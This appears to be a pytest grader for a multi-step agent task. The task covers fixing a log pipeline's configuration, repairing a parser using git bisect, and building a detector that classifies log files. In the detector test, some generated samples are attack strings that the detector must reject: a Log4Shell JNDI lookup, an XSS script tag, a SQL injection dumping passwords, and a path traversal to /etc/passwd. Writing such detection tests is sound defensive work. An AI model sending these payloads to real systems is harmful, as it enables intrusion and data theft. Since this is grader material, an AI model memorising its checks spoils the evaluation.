def test_phase1_pipeline_restoration():
    # Check config.ini changes
    config_path = "/app/config.ini"
    assert os.path.isfile(config_path), f"{config_path} is missing."
    with open(config_path, "r") as f:
        config_content = f.read()

    assert "port = 6379" in config_content or "port=6379" in config_content, "Redis port in config.ini is not set to 6379."
    assert "queue_name = log_queue" in config_content or "queue_name=log_queue" in config_content, "queue_name in config.ini is not set to log_queue."

    # Test End-to-End flow
    test_string = "verification_test_string_" + str(time.time())
    data = json.dumps({"log": test_string}).encode("utf-8")
    req = urllib.request.Request("http://localhost:8080/ingest", data=data, headers={"Content-Type": "application/json"})

    try:
        response = urllib.request.urlopen(req, timeout=5)
        assert response.status == 200, f"API returned status code {response.status}"
    except Exception as e:
        pytest.fail(f"Failed to send request to API: {e}")

    time.sleep(2)

    processed_log_path = "/app/processed.log"
    assert os.path.isfile(processed_log_path), f"{processed_log_path} was not created."

    with open(processed_log_path, "r") as f:
        processed_content = f.read()

    assert test_string in processed_content, f"Test string '{test_string}' was not found in {processed_log_path}. Pipeline is not processing logs correctly."


def test_phase2_parser_fixed():
    repo = "/home/user/log_parser_repo"
    parser_path = os.path.join(repo, "parser.py")
    assert os.path.isfile(parser_path), f"{parser_path} is missing."
    with open(parser_path, "r") as f:
        content = f.read()

    assert "non_existent_module" not in content, "The bad import 'non_existent_module' is still in parser.py."

    # Preserve the original modern/legacy parser assertions.
    code = '''
import parser
res1 = parser.parse('{"msg": "modern"}')
res2 = parser.parse('{"msg": "\\"legacy format\\""}')
print("OK")
'''
    result = subprocess.run(["python3", "-c", code], cwd="/tmp", capture_output=True, text=True)
    assert "OK" in result.stdout and result.returncode == 0, f"Parser failed to handle both modern and legacy logs. Error: {result.stderr}"

    # Exercise the installed module on values generated by the verifier.
    token = secrets.token_hex(12)
    payloads = [
        {"msg": f"modern-{token}"},
        {"msg": f'"legacy {token}"'},
        {"msg": f"escaped \\\"{token}\\\" value"},
        {"nested": {"id": token, "values": [1, True, None]}},
    ]
    for _ in range(8):
        payloads.append({"msg": secrets.token_urlsafe(18), "number": random.randint(-1000000, 1000000)})

    probe = '''
import json, os, sys
import parser
items = json.loads(sys.stdin.read())
result = [parser.parse(json.dumps(item)) for item in items]
print(json.dumps({"module": os.path.realpath(parser.__file__), "result": result}))
'''
    env = os.environ.copy()
    env.pop("PYTHONPATH", None)
    installed = subprocess.run(
        ["python3", "-c", probe],
        cwd="/tmp",
        input=json.dumps(payloads),
        capture_output=True,
        text=True,
        env=env,
    )
    assert installed.returncode == 0, f"Installed parser failed randomized parsing: {installed.stderr}"
    parsed_output = json.loads(installed.stdout.strip())
    assert parsed_output["result"] == payloads, "Installed parser did not preserve verifier-generated JSON values."
    assert parsed_output["module"] == os.path.realpath(parser_path), "System Python is not using the repaired parser package."

    # Verify repository evidence that git bisect traversed the actual regression commit.
    culprit = subprocess.run(
        ["git", "log", "--format=%H", "--grep=^Commit 7: refactor parser$", "-1"],
        cwd=repo,
        capture_output=True,
        text=True,
        check=True,
    ).stdout.strip()
    assert culprit, "Could not identify the regression-introducing commit in repository history."

    reflog = subprocess.run(
        ["git", "reflog", "--all", "--format=%H%x09%gs"],
        cwd=repo,
        capture_output=True,
        text=True,
        check=True,
    ).stdout.splitlines()
    checkout_hashes = {
        line.split("\t", 1)[0]
        for line in reflog
        if "\tcheckout: moving from " in line
    }
    bisect_log_path = os.path.join(repo, ".git", "BISECT_LOG")
    bisect_log = ""
    if os.path.isfile(bisect_log_path):
        with open(bisect_log_path, "r", errors="replace") as f:
            bisect_log = f.read()

    used_bisect = (culprit in checkout_hashes and len(checkout_hashes) >= 2) or culprit in bisect_log
    assert used_bisect, "No repository evidence shows that git bisect was used to locate Commit 7."


def _read_results(path):
    rows = []
    with open(path, "r", newline="") as f:
        for row in csv.reader(f):
            if len(row) >= 2:
                rows.append((row[0], row[1].strip().upper()))
    return rows


def test_phase3_security_detector():
    detector_script = "/home/user/detector.py"
    assert os.path.isfile(detector_script), f"{detector_script} is missing."

    clean_dir = "/var/opt/verifier/clean"
    evil_dir = "/var/opt/verifier/evil"
    clean_csv = "/tmp/clean_results.csv"
    evil_csv = "/tmp/evil_results.csv"
    for output in (clean_csv, evil_csv):
        if os.path.exists(output):
            os.unlink(output)

    # Preserve the original fixed-corpus checks.
    res_clean = subprocess.run(["python3", detector_script, clean_dir, clean_csv], capture_output=True, text=True)
    assert res_clean.returncode == 0, f"Detector script failed on clean corpus: {res_clean.stderr}"
    assert os.path.isfile(clean_csv), f"Detector script did not produce {clean_csv}"

    res_evil = subprocess.run(["python3", detector_script, evil_dir, evil_csv], capture_output=True, text=True)
    assert res_evil.returncode == 0, f"Detector script failed on evil corpus: {res_evil.stderr}"
    assert os.path.isfile(evil_csv), f"Detector script did not produce {evil_csv}"

    clean_files = [f for f in os.listdir(clean_dir) if f.endswith(".log")]
    clean_results = dict(_read_results(clean_csv))
    clean_modified = [cf for cf in clean_files if clean_results.get(cf) != "ACCEPT"]

    evil_files = [f for f in os.listdir(evil_dir) if f.endswith(".log")]
    evil_results = dict(_read_results(evil_csv))
    evil_bypassed = [ef for ef in evil_files if evil_results.get(ef) != "REJECT"]

    error_msgs = []
    if evil_bypassed:
        error_msgs.append(f"{len(evil_bypassed)} of {len(evil_files)} evil bypassed: {', '.join(evil_bypassed)}")
    if clean_modified:
        error_msgs.append(f"{len(clean_modified)} of {len(clean_files)} clean modified (rejected): {', '.join(clean_modified)}")
    if error_msgs:
        pytest.fail(" | ".join(error_msgs))

    # Use an unpredictable, mixed corpus so decisions must be based on each file's contents.
    with tempfile.TemporaryDirectory(prefix="corpus_" + uuid.uuid4().hex + "_") as mixed_dir:
        marker = secrets.token_hex(10)
        samples = [
            (json.dumps({"log": f"ordinary service event {marker}"}), "ACCEPT"),
            (json.dumps({"log": f'user said "hello" ({marker})'}), "ACCEPT"),
            (json.dumps({"log": {"request_id": marker, "status": 200}}), "ACCEPT"),
            (json.dumps({"log": f"base64-like QWxhZGRpbjpvcGVuU2VzYW1l{marker}"}), "ACCEPT"),
            (json.dumps({"log": f"${{jndi:ldap://{marker}.invalid/a}}"}), "REJECT"),
            (json.dumps({"log": f"<script>alert('{marker}')</script>"}), "REJECT"),
            (json.dumps({"log": f"' UNION SELECT username,password FROM users -- {marker}"}), "REJECT"),
            (json.dumps({"log": f"../../../../etc/passwd?ref={marker}"}), "REJECT"),
        ]
        random.SystemRandom().shuffle(samples)
        expected = {}
        for body, decision in samples:
            filename = uuid.uuid4().hex + ".log"
            expected[filename] = decision
            with open(os.path.join(mixed_dir, filename), "w") as f:
                f.write(body + "\n")

        output_csv = os.path.join(tempfile.gettempdir(), uuid.uuid4().hex + ".csv")
        try:
            run = subprocess.run(["python3", detector_script, mixed_dir, output_csv], capture_output=True, text=True)
            assert run.returncode == 0, f"Detector failed on verifier-generated corpus: {run.stderr}"
            assert os.path.isfile(output_csv), "Detector did not create output for verifier-generated corpus."
            rows = _read_results(output_csv)
            assert len(rows) == len(expected), "Detector must output exactly one result for every .log file."
            assert len({name for name, _ in rows}) == len(expected), "Detector emitted duplicate or missing filenames."
            actual = dict(rows)
            assert set(actual) == set(expected), "Detector output filenames do not match the input corpus."
            assert all(value in {"ACCEPT", "REJECT"} for value in actual.values()), "Detector emitted an invalid decision."
            assert actual == expected, "Detector misclassified content in the verifier-generated mixed corpus."
        finally:
            if os.path.exists(output_csv):
                os.unlink(output_csv)
